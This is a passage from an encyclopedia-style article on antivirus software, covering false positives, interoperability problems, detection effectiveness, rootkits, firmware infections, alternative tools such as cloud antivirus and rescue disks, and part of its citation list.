 web browser, rival to Microsoft's own 
Internet Explorer
. MSE flagged Chrome as a 
Zbot banking trojan
.
[
121
]


September 2012:
 
Sophos
' anti-virus suite identified various update-mechanisms, including its own, as malware. If it was configured to automatically delete detected files, Sophos Antivirus could render itself unable to update, required manual intervention to fix the problem.
[
122
]
[
123
]


September 2017:
 the Google Play Protect anti-virus started identifying 
Motorola
's 
Moto G4
 Bluetooth application as malware, causing Bluetooth functionality to become disabled.
[
124
]


September 2022:
 
Microsoft Defender
 flagged all Chromium based web browsers and Electron based apps like WhatsApp, Discord, Spotify as a severe threat.
[
125
]


System and interoperability related issues
[
edit
]


Running (the real-time protection of) multiple antivirus programs concurrently can degrade performance and create conflicts.
[
126
]
 However, using a concept called 
multiscanning
, several companies (including 
G Data Software
[
127
]
 and 
Microsoft
[
128
]
) have created applications which can run multiple engines concurrently.

It is sometimes necessary to temporarily disable virus protection when installing major updates such as Windows Service Packs or updating graphics card drivers.
[
129
]
 Active antivirus protection may partially or completely prevent the installation of a major update. Anti-virus software can cause problems during the installation of an operating system upgrade, e.g. when upgrading to a newer version of Windows "in place"—without erasing the previous version of Windows. Microsoft recommends that anti-virus software be disabled to avoid conflicts with the upgrade installation process.
[
130
]
[
131
]
[
132
]
 Active anti-virus software can also interfere with a 
firmware
 update process.
[
133
]


The functionality of a few computer programs can be hampered by active anti-virus software. For example, 
TrueCrypt
, a disk encryption program, states on its troubleshooting page that anti-virus programs can conflict with TrueCrypt and cause it to malfunction or operate very slowly.
[
134
]
 Anti-virus software can impair the performance and stability of games running in the 
Steam
 platform.
[
135
]


Support issues also exist around antivirus application interoperability with common solutions like 
SSL VPN remote access
 and 
network access control
 products.
[
136
]
 These technology solutions often have policy assessment applications that require an up-to-date antivirus to be installed and running. If the antivirus application is not recognized by the policy assessment, whether because the antivirus application has been updated or because it is not part of the policy assessment library, the user will be unable to connect.



Effectiveness
[
edit
]


Studies in December 2007 showed that the effectiveness of antivirus software had decreased in the previous year, particularly against unknown or 
zero day attacks
. The computer magazine 
c't
 found that detection rates for these threats had dropped from 40 to 50% in 2006 to 20–30% in 2007. At that time, the only exception was the 
NOD32
 antivirus, which managed a detection rate of 68%.
[
137
]
 According to the 
ZeuS tracker
 website the average detection rate for all variants of the well-known 
ZeuS
 trojan is as low as 40%.
[
138
]


The problem is magnified by the changing intent of virus authors. Some years ago it was obvious when a virus infection was present. At the time, viruses were written by amateurs and exhibited destructive behavior or 
pop-ups
. Modern viruses are often written by professionals, financed by 
criminal organizations
.
[
139
]


In 2008, 
Eva Chen
, 
CEO
 of 
Trend Micro
, stated that the anti-virus industry has over-hyped how effective its products are—and so has been misleading customers—for years.
[
140
]


Independent testing on all the major virus scanners consistently shows that none provides 100% virus detection. The best ones provided as high as 99.9% detection for simulated real-world situations, while the lowest provided 91.1% in tests conducted in August 2013. Many virus scanners produce false positive results as well, identifying benign files as malware.
[
141
]


Although methods may differ, some notable independent quality testing agencies include 
AV-Comparatives
, 
ICSA Labs
, 
SE Labs
, West Coast Labs, 
Virus Bulletin
, 
AV-TEST
 and other members of the 
Anti-Malware Testing Standards Organization
.
[
142
]
[
143
]




New viruses
[
edit
]


Anti-virus programs are not always effective against new viruses, even those that use non-signature-based methods that should detect new viruses. The reason for this is that the virus designers test their new viruses on the major anti-virus applications to make sure that they are not detected before releasing them into the wild.
[
144
]


Some new viruses, particularly 
ransomware
, use 
polymorphic code
 to avoid detection by virus scanners. Jerome Segura, a security analyst with ParetoLogic, explained:
[
145
]




It's something that they miss a lot of the time because this type of [ransomware virus] comes from sites that use a polymorphism, which means they basically randomize the file they send you and it gets by well-known antivirus products very easily. I've seen people firsthand getting infected, having all the pop-ups and yet they have antivirus software running and it's not detecting anything. It actually can be pretty hard to get rid of, as well, and you're never really sure if it's really gone. When we see something like that usually we advise to reinstall the operating system or reinstall backups.
[
145
]


A 
proof of concept
 virus has used the 
Graphics Processing Unit
 (GPU) to avoid detection from anti-virus software. The potential success of this involves bypassing the 
CPU
 in order to make it much harder for security researchers to analyse the inner workings of such malware.
[
146
]




Rootkits
[
edit
]


Detecting 
rootkits
 is a major challenge for anti-virus programs. Rootkits have full administrative access to the computer and are invisible to users and hidden from the list of running processes in the 
task manager
. Rootkits can modify the inner workings of the 
operating system
 and tamper with antivirus programs.
[
147
]




Damaged files
[
edit
]


If a file has been infected by a computer virus, anti-virus software will attempt to remove the virus code from the file during disinfection, but it is not always able to restore the file to its undamaged state.
[
148
]
[
149
]
 In such circumstances, damaged files can only be restored from existing backups or shadow copies (this is also true for 
ransomware
[
150
]
); installed software that is damaged requires re-installation
[
151
]
 (however, see 
System File Checker
).



Firmware infections
[
edit
]


Any writeable firmware in the computer can be infected by malicious code.
[
152
]
 This is a major concern, as an infected 
BIOS
 could require the actual BIOS chip to be replaced to ensure the malicious code is completely removed.
[
153
]
 Anti-virus software is not effective at protecting firmware and the 
motherboard
 BIOS from infection.
[
154
]
 In 2014, security researchers discovered that 
USB
 devices contain writeable firmware which can be modified with malicious code (dubbed "
BadUSB
"), which anti-virus software cannot detect or prevent. The malicious code can run undetected on the computer and could even infect the operating system prior to it booting up.
[
155
]
[
156
]




Performance and other drawbacks
[
edit
]


Antivirus software has some drawbacks, first of which that it can impact a 
computer's performance
.
[
157
]


Furthermore, inexperienced users can be lulled into a false sense of security when using the computer, considering their computers to be invulnerable, and may have problems understanding the prompts and decisions that antivirus software presents them with. An incorrect decision may lead to a security breach. If the antivirus software employs heuristic detection, it must be fine-tuned to minimize misidentifying harmless software as malicious (
false positive
).
[
158
]


Antivirus software itself usually runs at the highly trusted 
kernel
 level of the 
operating system
 to allow it access to all the potential malicious process and files, creating a potential avenue of 
attack
.
[
159
]
 The US 
National Security Agency
 (NSA) and the UK 
Government Communications Headquarters
 (GCHQ) intelligence agencies, 
respectively, have been exploiting anti-virus software to spy on users.
[
160
]
 Anti-virus software has highly privileged and trusted access to the underlying operating system, which makes it a much more appealing target for remote attacks.
[
161
]
 Additionally anti-virus software is "years behind security-conscious client-side applications like browsers or document readers. It means that Acrobat Reader, Microsoft Word or Google Chrome are harder to exploit than 90 percent of the anti-virus products out there", according to Joxean Koret, a researcher with Coseinc, a Singapore-based 
information security
 consultancy.
[
161
]




Alternative solutions
[
edit
]


The command-line virus scanner of 
Clam AV 0.95.2
 running a virus signature definition update, scanning a file, and identifying a 
Trojan


Antivirus software running on individual computers is the most common method employed of guarding against malware, but it is not the only solution. Other solutions can also be employed by users, including 
Unified Threat Management
 (
UTM
), hardware and network firewalls, 
Cloud-based
 antivirus and online scanners.



Hardware and network firewall
[
edit
]


Network firewalls prevent unknown programs and processes from accessing the system. However, they are not antivirus systems and make no attempt to identify or remove anything. They may protect against infection from outside the protected computer or 
network
, and limit the activity of any malicious software which is present by blocking incoming or outgoing requests on certain 
TCP/IP
 ports. A 
firewall
 is designed to deal with broader system threats that come from network connections into the system and is not an alternative to a virus protection system.



Cloud antivirus
[
edit
]


Cloud antivirus is a technology that uses lightweight agent software on the protected computer, while offloading the majority of data analysis to the provider's infrastructure.
[
162
]


One approach to implementing cloud antivirus involves scanning suspicious files using multiple antivirus engines. This approach was proposed by an early implementation of the cloud antivirus concept called CloudAV. CloudAV was designed to send programs or documents to a 
network cloud
 where multiple antivirus and behavioral detection programs are used simultaneously in order to improve detection rates. Parallel scanning of files using potentially incompatible antivirus scanners is achieved by spawning a virtual machine per detection engine and therefore eliminating any possible issues. CloudAV can also perform "retrospective detection", whereby the cloud detection engine rescans all files in its file access history when a new threat is identified thus improving new threat detection speed. Finally, CloudAV is a solution for effective virus scanning on devices that lack the computing power to perform the scans themselves.
[
163
]


Some examples of cloud anti-virus products are 
Panda Cloud Antivirus
 and 
Immunet
. 
Comodo Group
 has also produced cloud-based anti-virus.
[
164
]
[
165
]




Online scanning
[
edit
]


Some antivirus vendors maintain websites with free online scanning capability of the entire computer, critical areas only, local disks, folders or files. Periodic online scanning is a good idea for those that run antivirus applications on their computers because those applications are frequently slow to catch threats. One of the first things that malicious software does in an attack is disable any existing antivirus software and sometimes the only way to know of an attack is by turning to an online resource that is not installed on the infected computer.
[
166
]




Specialized tools
[
edit
]


The command-line 
rkhunter
 scanner is an engine to scan for 
Linux
 
rootkits
 running on 
Ubuntu
.


Virus removal tools are available to help remove stubborn infections or a certain type of infection. Examples include 
Windows Malicious Software Removal Tool
,
[
167
]
 
Sophos
 Scan & Clean
,
[
168
]
 and 
Kaspersky
 Virus Removal Tool
.
[
169
]
 It is also worth noting that sometimes antivirus software can produce a false-positive result, indicating an infection where there is none.
[
170
]


A rescue disk that is bootable, such as a CD or USB storage device, can be used to run antivirus software outside of the installed operating system in order to remove infections while they are dormant. A bootable rescue disk can be useful when, for example, the installed operating system is no longer bootable or has malware that is resisting all attempts to be removed by the installed antivirus software. Examples of software that can be used on a bootable rescue disk include the 
Trend Micro
 Rescue Disk
,
[
171
]
 
Kaspersky
 Rescue Disk
,
[
172
]
 and 
Comodo
 Rescue Disk
.
[
173
]
 Most of the rescue disk software can also be installed onto a USB storage device that is bootable on newer computers.



Usage and risks
[
edit
]


According to an FBI survey, major businesses lose $12 million annually dealing with virus incidents.
[
174
]
 A survey by 
Symantec
 in 2009 found that a third of small to medium-sized business did not use antivirus protection at that time, whereas more than 80% of home users had some kind of antivirus installed.
[
175
]
 According to a sociological survey conducted by 
G Data Software
 in 2010 49% of women did not use any antivirus program at all.
[
176
]




See also
[
edit
]


Anti-virus and anti-malware software


CARO
, the Computer Antivirus Research Organization


Comparison of antivirus software


Comparison of computer viruses


EICAR
, the European Institute for Computer Antivirus Research


Endpoint detection and response


Firewall software


Internet security


Linux malware


Quarantine (antivirus program)


Sandbox (computer security)


Timeline of computer viruses and worms


Virus hoax


Citations
[
edit
]






^
 
"What is antivirus software?"
. Microsoft. 
Archived
 from the original on April 11, 2011.




^
 
Thomas Chen, Jean-Marc Robert (2004). 
"The Evolution of Viruses and Worms"
. Archived from 
the original
 on May 17, 2009
. Retrieved 
February 16,
 2009
.




^
 
From the first email to the first YouTube video: a definitive internet history
 
Archived
 December 31, 2016, at the 
Wayback Machine
. Tom Meltzer and Sarah Phillips. 
The Guardian
. October 23, 2009




^
 
IEEE Annals of the History of Computing, Volumes 27–28
. IEEE Computer Society, 2005. 
74
 
Archived
 May 13, 2016, at the 
Wayback Machine
: "[...]from one machine to another led to experimentation with the 
Creeper
 program, which became the world's first computer worm: a computation that used the network to recreate itself on another node, and spread from node to node."




^ 
a
 
b
 
Metcalf, John (2014). 
"Core War: Creeper & Reaper"
. 
Archived
 from the original on May 2, 2014
. Retrieved 
May 1,
 2014
.




^
 
"Creeper – The Virus Encyclopedia"
. 
Archived
 from the original on September 20, 2015.




^
 
"Elk Cloner"
. 
Archived
 from the original on January 7, 2011
. Retrieved 
December 10,
 2010
.




^
 
"Top 10 Computer Viruses: No. 10 – Elk Cloner"
. 
Archived
 from the original on February 7, 2011
. Retrieved 
December 10,
 2010
.




^
 
"List of Computer Viruses Developed in 1980s"
. 
Archived
 from the original on July 24, 2011
. Retrieved 
December 10,
 2010
.




^
 
Fred Cohen: "Computer Viruses – Theory and Experiments" (1983)
 
Archived
 June 8, 2011, at the 
Wayback Machine
. Eecs.umich.edu (November 3, 1983). Retrieved on 2017-01-03.




^
 
Cohen, Fred (April 1, 1988). "Invited Paper: On the Implications of Computer Viruses and Methods of Defense". 
Computers & Security
. 
7
 (2): 167–184. 
doi
:
10.1016/0167-4048(88)90334-3
.




^
 
Szor 2005
, p. 
[
page needed
]
.




^
 
"Virus Bulletin :: In memoriam: Péter Ször 1970–2013"
. 
Archived
 from the original on August 26, 2014.




^
 
Bassham, Lawrence; Polk, W. (October 1992). 
"History of Viruses"
. 
Nistir 4939
. 
doi
:
10.6028/NIST.IR.4939
. 
Archived
 from the original on April 23, 2011.




^
 
Leyden, John (January 19, 2006). 
"PC virus celebrates 20th birthday"
. 
The Register
. 
Archived
 from the original on September 6, 2010
. Retrieved 
March 21,
 2011
.




^
 
"The History of Computer Viruses"
. November 10, 2017.




^
 
Panda Security (April 2004). 
"(II) Evolution of computer viruses"
. Archived from 
the original
 on August 2, 2009
. Retrieved 
June 20,
 2009
.




^
 
Kaspersky Lab Virus list
. viruslist.com




^
 
Wells, Joe (August 30, 1996). 
"Virus timeline"
. 
IBM
. 
Archived
 from the original on June 4, 2008
. Retrieved 
June 6,
 2008
.




^
 
G Data Software AG (2017). 
"G Data presents first Antivirus solution in 1987"
. 
Archived
 from the original on March 15, 2017
. Retrieved 
December 13,
 2017
.




^
 
Karsmakers, Richard (January 2010). 
"The ultimate Virus Killer Book and Software"
. 
Archived
 from the original on July 29, 2016
. Retrieved 
July 6,
 2016
.




^
 
Cavendish, Marshall (2007). 
Inventors and Inventions, Volume 4
. Paul Bernabeo. p. 1033. 
ISBN
 
978-0761477679
.




^
 
"About ESET Company"
. 
Archived
 from the original on October 28, 2016.




^
 
"ESET NOD32 Antivirus"
. Vision Square. February 16, 2016. 
Archived
 from the original on February 24, 2016.




^ 
a
 
b
 
Cohen, Fred, 
An Undetectable Computer Virus (Archived)
, 1987, IBM




^
 
Yevics, Patricia A. 
"Flu Shot for Computer Viruses"
. americanbar.org. 
Archived
 from the original on August 26, 2014.




^
 
Strom, David (April 1, 2010). 
"How friends help friends on the Internet: The Ross Greenberg Story"
. wordpress.com. 
Archived
 from the original on August 26, 2014.




^
 
"Anti-virus is 30 years old"
. spgedwards.com. April 2012. 
Archived
 from the original on April 27, 2015.




^
 
"A Brief History of Antivirus Software"
. techlineinfo.com. 
Archived
 from the original on August 26, 2014.




^
 
Grimes, Roger A. (June 1, 2001). 
Malicious Mobile Code: Virus Protection for Windows
. O'Reilly Media, Inc. p. 522. 
ISBN
 
9781565926820
. 
Archived
 from the original on March 21, 2017.




^
 
"Friðrik Skúlason ehf"
 (in Icelandic). Archived from 
the original
 on June 17, 2006.




^
 
Direccion General del Derecho de Autor, SEP, Mexico D.F. Registry 20709/88 Book 8, page 40, dated November 24, 1988.




^ 
a
 
b
 
"The 'Security Digest' Archives (TM) : www.phreak.org-virus_l"
. 
Archived
 from the original on January 5, 2010.




^
 
"Symantec Softwares and Internet Security at PCM"
. 
Archived
 from the original on July 1, 2014.




^
 
SAM Identifies Virus-Infected Files, Repairs Applications, 
InfoWorld
, May 22, 1989




^
 
SAM Update Lets Users Program for New Viruses, 
InfoWorld
, February 19, 1990




^
 
Naveen, Sharanya. 
"Panda Security"
. Archived from 
the original
 on June 30, 2016
. Retrieved 
May 31,
 2016
.




^
 
"Who we are – TG Soft Software House"
. 
www.tgsoft.it
. 
Archived
 from the original on October 13, 2014.




^
 
"A New Virus Naming Convention (1991) – CARO – Computer Antivirus Research Organization"
. 
Archived
 from the original on August 13, 2011.




^
 
"CARO Members"
. CARO. 
Archived
 from the original on July 18, 2011
. Retrieved 
June 6,
 2011
.




^
 
CAROids, Hamburg 2003
 
Archived
 November 7, 2014, at the 
Wayback Machine




^
 
"F-Secure Weblog : News from the Lab"
. F-secure.com. 
Archived
 from the original on September 23, 2012
. Retrieved 
September 23,
 2012
.




^
 
"About EICAR"
. 
EICAR official website
. Archived from 
the original
 on June 14, 2018
. Retrieved 
October 28,
 2013
.




^
 
Harley, David; Myers, Lysa; Willems, Eddy. 
"Test Files and Product Evaluation: the Case for and against Malware Simulation"
 
(PDF)
. 
AVAR2010 13th Association of anti Virus Asia Researchers International Conference
. Archived from 
the original
 
(PDF)
 on September 29, 2011
. Retrieved 
June 30,
 2011
.




^
 
"Dr. Web LTD Doctor Web / Dr. Web Reviews, Best AntiVirus Software Reviews, Review Centre"
. Reviewcentre.com. 
Archived
 from the original on February 23, 2014
. Retrieved 
February 17,
 2014
.




^ 
a
 
b
 
c
 
d
 
[In 1994, AV-Test.org reported 28,613 unique malware samples (based on MD5). "A Brief History of Malware; The First 25 Years"]




^
 
"BitDefender Product History"
. Archived from 
the original
 on March 17, 2012.




^
 
"InfoWatch Management"
. InfoWatch. 
Archived
 from the original on August 21, 2013
. Retrieved 
August 12,
 2013
.




^
 
"Linuxvirus – Community Help Wiki"
. 
Archived
 from the original on March 24, 2017.




^
 
"Sorry – recovering..."
 
Archived
 from the original on August 26, 2014.




^
 
"Sourcefire acquires ClamAV"
. ClamAV. August 17, 2007. Archived from 
the original
 on December 15, 2007
. Retrieved 
February 12,
 2008
.




^
 
"Cisco Completes Acquisition of Sourcefire"
. 
cisco.com
. October 7, 2013. 
Archived
 from the original on January 13, 2015
. Retrieved 
June 18,
 2014
.




^
 
Der Unternehmer – brand eins online
 
Archived
 November 22, 2012, at the 
Wayback Machine
. Brandeins.de (July 2009). Retrieved on January 3, 2017.




^
 
Williams, Greg (April 2012). 
"The digital detective: Mikko Hypponen's war on malware is escalating"
. 
Wired
. 
Archived
 from the original on March 15, 2016.




^
 
"Everyday cybercrime – and what you can do about it"
. 
Archived
 from the original on February 20, 2014.




^
 
Szor 2005
, pp. 66–67.




^
 
"New virus travels in PDF files"
. August 7, 2001. 
Archived
 from the original on June 16, 2011
. Retrieved 
October 29,
 2011
.




^
 
Slipstick Systems (February 2009). 
"Protecting Microsoft Outlook against Viruses"
. 
Archived
 from the original on June 2, 2009
. Retrieved 
June 18,
 2009
.




^
 
"CloudAV: N-Version Antivirus in the Network Cloud"
. usenix.org. 
Archived
 from the original on August 26, 2014.




^
 
McAfee Artemis Preview Report
 
Archived
 April 3, 2016, at the 
Wayback Machine
. av-comparatives.org




^
 
McAfee Third Quarter 2008
 
Archived
 April 3, 2016, at the 
Wayback Machine
. corporate-ir.net




^
 
"AMTSO Best Practices for Testing In-the-Cloud Security Products"
. AMTSO. Archived from 
the original
 on April 14, 2016
. Retrieved 
March 21,
 2016
.




^
 
"TECHNOLOGY OVERVIEW"
. 
AVG Security
. Archived from 
the original
 on June 2, 2015
. Retrieved 
February 16,
 2015
.




^
 
Barrett, Brian (October 18, 2018). 
"The Mysterious Return of Years-Old Chinese Malware"
. 
Wired
. Retrieved 
June 16,
 2019
 – via www.wired.com.




^
 
"Magic Quadrant Endpoint Protection Platforms 2016"
. Gartner Research.




^
 
Messmer, Ellen (August 20, 2014). 
"Start-up offers up endpoint detection and response for behavior-based malware detection"
. networkworld.com. 
Archived
 from the original on February 5, 2015.




^
 
"Homeland Security Today: Bromium Research Reveals Insecurity in Existing Endpoint Malware Protection Deployments"
. 
Archived
 from the original on September 24, 2015.




^
 
"Duelling Unicorns: CrowdStrike Vs. Cylance In Brutal Battle To Knock Hackers Out"
. 
Forbes
. July 6, 2016. 
Archived
 from the original on September 11, 2016.




^
 
Potter, Davitt (June 9, 2016). 
"Is Anti-virus Dead? The Shift Toward Next-Gen Endpoints"
. 
Archived
 from the original on December 20, 2016.




^
 
"CylancePROTECT® Achieves HIPAA Security Rule Compliance Certification"
. Cylance. Archived from 
the original
 on October 22, 2016
. Retrieved 
October 21,
 2016
.




^
 
"Trend Micro-XGen"
. Trend Micro. October 18, 2016. 
Archived
 from the original on December 21, 2016.




^
 
"Next-Gen Endpoint"
. Sophos. 
Archived
 from the original on November 6, 2016.




^
 
The Forrester Wave™: Endpoint Security Suites, Q4 2016
 
Archived
 October 22, 2016, at the 
Wayback Machine
. Forrester.com (October 19, 2016). Retrieved on 2017-01-03.




^
 
Paul Wagenseil (May 25, 2016). 
"Is Windows Defender Good Enough? Not Yet"
. 
Tom's Guide
. Retrieved 
December 18,
 2023
.




^
 
"Test antivirus software for Windows 11 - October 2023"
. 
www.av-test.org
. Retrieved 
December 18,
 2023
.




^
 
"Google Trends"
. 
Google Trends
. Retrieved 
December 18,
 2023
.




^
 
"McAfee Becomes Intel Security"
. McAfee Inc. Archived from 
the original
 on January 15, 2014
. Retrieved 
January 15,
 2014
.




^
 
"Avast Announces Agreement to Acquire AVG for $1.3B"
. 
Avast Announces Agreement to Acquire AVG for $1.3B
. Retrieved 
December 18,
 2023
.




^
 
Lunden, Ingrid (December 7, 2020). 
"NortonLifeLock acquires Avira in $360M all-cash deal, 8 months after Avira was acquired for $180M"
. 
TechCrunch
. Retrieved 
December 18,
 2023
.




^
 
Daniel Todd (February 7, 2022). 
"BullGuard to drop name in favour of Norton branding"
. 
channelpro
. Retrieved 
December 18,
 2023
.




^
 
"NortonLifeLock Completes Merger with Avast"
. 
NortonLifeLock Completes Merger with Avast
. Retrieved 
December 18,
 2023
.




^
 
Lv, Mingqi; Zeng, Huan; Chen, Tieming; Zhu, Tiantian (October 1, 2023). 
"CTIMD: Cyber Threat Intelligence Enhanced Malware Detection Using API Call Sequences with Parameters"
. 
Computers & Security
. 
136
: 103518. 
doi
:
10.1016/j.cose.2023.103518
. 
ISSN
 
0167-4048
.




^
 
Sandboxing Protects Endpoints | Stay Ahead Of Zero Day Threats
 
Archived
 April 2, 2015, at the 
Wayback Machine
. Enterprise.comodo.com (June 20, 2014). Retrieved on 2017-01-03.




^
 
Szor 2005
, pp. 474–481.




^
 
Kiem, Hoang; Thuy, Nguyen Yhanh and Quang, Truong Minh Nhat (December 2004) "A Machine Learning Approach to Anti-virus System", 
Joint Workshop of Vietnamese Society of AI, SIGKBS-JSAI, ICS-IPSJ and IEICE-SIGAI on Active Mining; Session 3: Artificial Intelligence
, Vol. 67, pp. 61–65




^
 
Data Mining Methods for Malware Detection
. 2008. pp. 15–. 
ISBN
 
978-0-549-88885-7
. 
Archived
 from the original on March 20, 2017.




^
 
Dua, Sumeet; Du, Xian (April 19, 2016). 
Data Mining and Machine Learning in Cybersecurity
. CRC Press. pp. 1–. 
ISBN
 
978-1-4398-3943-0
. 
Archived
 from the original on March 20, 2017.




^
 
Firdausi, Ivan; Lim, Charles; Erwin, Alva; Nugroho, Anto Satriyo (2010). "Analysis of Machine learning Techniques Used in Behavior-Based Malware Detection". 
2010 Second International Conference on Advances in Computing, Control, and Telecommunication Technologies
. p. 201. 
doi
:
10.1109/ACT.2010.33
. 
ISBN
 
978-1-4244-8746-2
. 
S2CID
 
18522498
.




^
 
Siddiqui, Muazzam; Wang, Morgan C.; Lee, Joohan (2008). "A survey of data mining techniques for malware detection using file features". 
Proceedings of the 46th Annual Southeast Regional Conference on XX – ACM-SE 46
. p. 509. 
doi
:
10.1145/1593105.1593239
. 
ISBN
 
9781605581057
. 
S2CID
 
729418
.




^
 
Deng, P.S.; Jau-Hwang Wang; Wen-Gong Shieh; Chih-Pin Yen; Cheng-Tan Tung (2003). "Intelligent automatic malicious code signatures extraction". 
IEEE 37th Annual 2003 International Carnahan Conference on 
Security
 Technology, 2003. Proceedings
. p. 600. 
doi
:
10.1109/CCST.2003.1297626
. 
ISBN
 
978-0-7803-7882-7
. 
S2CID
 
56533298
.




^
 
Komashinskiy, Dmitriy; Kotenko, Igor (2010). "Malware Detection by Data Mining Techniques Based on Positionally Dependent Features". 
2010 18th Euromicro Conference on Parallel, Distributed and Network-based Processing
. p. 617. 
doi
:
10.1109/PDP.2010.30
. 
ISBN
 
978-1-4244-5672-7
. 
S2CID
 
314909
.




^
 
Schultz, M.G.; Eskin, E.; Zadok, F.; Stolfo, S.J. (2001). "Data mining methods for detection of new malicious executables". 
Proceedings 2001 IEEE Symposium on Security and Privacy. S&P 2001
. p. 38. 
CiteSeerX
 
10.1.1.408.5676
. 
doi
:
10.1109/SECPRI.2001.924286
. 
ISBN
 
978-0-7695-1046-0
. 
S2CID
 
21791
.




^
 
Ye, Yanfang; Wang, Dingding; Li, Tao; Ye, Dongyi (2007). "IMDS". 
Proceedings of the 13th ACM SIGKDD international conference on Knowledge discovery and data mining – KDD '07
. p. 1043. 
doi
:
10.1145/1281192.1281308
. 
ISBN
 
9781595936097
. 
S2CID
 
8142630
.




^
 
Kolter, J. Zico; Maloof, Marcus A. (December 1, 2006). 
"Learning to Detect and Classify Malicious Executables in the Wild"
. 
J. Mach. Learn. Res
. 
7
: 2721–2744.




^
 
Tabish, S. Momina; Shafiq, M. Zubair; Farooq, Muddassar (2009). "Malware detection using statistical analysis of byte-level file content". 
Proceedings of the ACM SIGKDD Workshop on Cyber 
Security
 and Intelligence Informatics – CSI-KDD '09
. p. 23. 
CiteSeerX
 
10.1.1.466.5074
. 
doi
:
10.1145/1599272.1599278
. 
ISBN
 
9781605586694
. 
S2CID
 
10661197
.




^
 
Ye, Yanfang; Wang, Dingding; Li, Tao; Ye, Dongyi; Jiang, Qingshan (2008). "An intelligent PE-malware detection system based on association mining". 
Journal in Computer Virology
. 
4
 (4): 323. 
CiteSeerX
 
10.1.1.172.4316
. 
doi
:
10.1007/s11416-008-0082-4
. 
S2CID
 
207288887
.




^
 
Sami, Ashkan; Yadegari, Babak; Peiravian, Naser; Hashemi, Sattar; Hamze, Ali (2010). "Malware detection based on mining API calls". 
Proceedings of the 2010 ACM Symposium on Applied Computing – SAC '10
. p. 1020. 
doi
:
10.1145/1774088.1774303
. 
ISBN
 
9781605586397
. 
S2CID
 
9330550
.




^
 
Shabtai, Asaf; Kanonov, Uri; Elovici, Yuval; Glezer, Chanan; Weiss, Yael (2011). "
"Andromaly": A behavioral malware detection framework for android devices". 
Journal of Intelligent Information Systems
. 
38
: 161. 
doi
:
10.1007/s10844-010-0148-x
. 
S2CID
 
6993130
.




^
 
Fox-Brewster, Thomas. 
"Netflix Is Dumping Anti-Virus, Presages Death Of An Industry"
. 
Forbes
. 
Archived
 from the original on September 6, 2015
. Retrieved 
September 4,
 2015
.




^
 
Automatic Malware Signature Generation
 
Archived
 January 24, 2021, at the 
Wayback Machine
. (PDF) . Retrieved on January 3, 2017.




^
 
Szor 2005
, pp. 252–288.




^
 
"Generic detection"
. Kaspersky. Archived from 
the original
 on December 3, 2013
. Retrieved 
July 11,
 2013
.




^
 
Symantec Corporation (February 2009). 
"Trojan.Vundo"
. Archived from 
the original
 on April 9, 2009
. Retrieved 
April 14,
 2009
.




^
 
Symantec Corporation (February 2007). 
"Trojan.Vundo.B"
. Archived from 
the original
 on April 27, 2009
. Retrieved 
April 14,
 2009
.




^
 
"Antivirus Research and Detection Techniques"
. ExtremeTech. 
Archived
 from the original on February 27, 2009
. Retrieved 
February 24,
 2009
.




^
 
"Terminology – F-Secure Labs"
. 
Archived
 from the original on August 24, 2010.




^
 
"Real-Time Protection"
. 
support.kaspersky.com
. Retrieved 
April 9,
 2021
.




^
 
"Kaspersky Cyber Security Solutions for Home & Business | Kaspersky"
. 
usa.kaspersky.com
. Archived from 
the original
 on March 12, 2006.




^
 
Kelly, Michael (October 2006). 
"Buying Dangerously"
. 
Archived
 from the original on July 15, 2010
. Retrieved 
November 29,
 2009
.




^
 
Bitdefender (2009). 
"Automatic Renewal"
. 
Archived
 from the original on October 6, 2009
. Retrieved 
November 29,
 2009
.




^
 
Symantec
 (2014). 
"Norton Automatic Renewal Service FAQ"
. 
Archived
 from the original on April 13, 2014
. Retrieved 
April 9,
 2014
.




^
 
SpywareWarrior (2007). 
"Rogue/Suspect Anti-Spyware Products & Web Sites"
. Retrieved 
November 29,
 2009
.




^
 
Protalinski, Emil (November 11, 2008). 
"AVG incorrectly flags user32.dll in Windows XP SP2/SP3"
. 
Ars Technica
. 
Archived
 from the original on April 30, 2011
. Retrieved 
February 24,
 2011
.




^
 
"McAfee to compensate businesses for buggy update"
. 
Archived
 from the original on September 4, 2010
. Retrieved 
December 2,
 2010
.




^
 
"Buggy McAfee update whacks Windows XP PCs"
. 
Archived
 from the original on January 13, 2011
. Retrieved 
December 2,
 2010
.




^
 
Tan, Aaron (May 24, 2007). 
"Flawed Symantec update cripples Chinese PCs"
. 
CNET Networks
. 
Archived
 from the original on April 26, 2011
. Retrieved 
April 5,
 2009
.




^ 
a
 
b
 
Harris, David (June 29, 2009). 
"January 2010 – Pegasus Mail v4.52 Release"
. 
Pegasus Mail
. 
Archived
 from the original on May 28, 2010
. Retrieved 
May 21,
 2010
.




^
 
"McAfee DAT 5958 Update Issues"
. April 21, 2010. 
Archived
 from the original on April 24, 2010
. Retrieved 
April 22,
 2010
.




^
 
"Botched McAfee update shutting down corporate XP machines worldwide"
. April 21, 2010. 
Archived
 from the original on April 22, 2010
. Retrieved 
April 22,
 2010
.




^
 
Leyden, John (December 2, 2010). 
"Horror AVG update ballsup bricks Windows 7"
. 
The Register
. 
Archived
 from the original on December 5, 2010
. Retrieved 
December 2,
 2010
.




^
 
MSE false positive detection forces Google to update Chrome
, October 3, 2011, archived from the original on October 4, 2011
, retrieved 
October 3,
 2011
{{
citation
}}
:  CS1 maint: unfit URL (
link
)




^
 
Sophos Antivirus Detects Itself as Malware, Deletes Key Binaries
, The Next Web, September 20, 2012, 
archived
 from the original on January 17, 2014
, retrieved 
March 5,
 2014




^
 
Shh/Updater-B false positive by Sophos anti-virus products
, 
Sophos
, September 19, 2012, 
archived
 from the original on April 21, 2014
, retrieved 
March 5,
 2014




^
 
If Google Play Protect is breaking bluetooth on your Moto G4 Plus, don't worry because there's a fix
, Android Police, September 11, 2017, 
archived
 from the original on November 7, 2017
, retrieved 
November 1,
 2017




^
 
Windows Defender is reporting a false-positive threat 'Behavior:Win32/Hive.ZY'; it's nothing to be worried about
, Windows Central, September 5, 2022, 
archived
 from the original on September 5, 2022
, retrieved 
September 5,
 2012




^
 
"Plus! 98: How to Remove McAfee VirusScan"
. 
Microsoft
. January 2007. 
Archived
 from the original on April 8, 2010
. Retrieved 
September 27,
 2014
.




^
 
Vamosi, Robert (May 28, 2009). 
"G-Data Internet Security 2010"
. 
PC World
. 
Archived
 from the original on February 11, 2011
. Retrieved 
February 24,
 2011
.




^
 
Higgins, Kelly Jackson (May 5, 2010). 
"New Microsoft Forefront Software Runs Five Antivirus Vendors' Engines"
. 
Darkreading
. 
Archived
 from the original on May 12, 2010
. Retrieved 
February 24,
 2011
.




^
 
"Steps to take before you install Windows XP Service Pack 3"
. 
Microsoft
